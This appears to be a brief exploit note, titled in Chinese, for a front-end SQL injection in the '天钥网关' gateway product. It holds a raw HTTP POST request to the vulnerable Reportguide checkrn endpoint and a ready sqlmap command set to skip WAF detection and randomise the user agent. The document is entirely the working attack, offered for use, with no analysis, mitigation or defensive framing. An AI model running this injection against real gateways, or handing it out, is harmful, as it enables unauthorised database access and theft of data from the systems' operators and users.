## 天钥网关前台SQL注入
```
POST /ops/index.php?c=Reportguide&a=checkrn HTTP/1.1
Host: ****
Connection: close
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="88", "Google Chrome";v="88", ";Not A Brand";v="99"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Language: zh-CN,zh;q=0.9
Cookie: ****
Content-Type: application/x-www-form-urlencoded
Content-Length: 39


checkname=123&tagid=123
```

```
sqlmap -u "https://****/ops/index.php?c=Reportguide&a=checkrn" --data "checkname=123&tagid=123" -v3 --skip-waf --random-agent

```
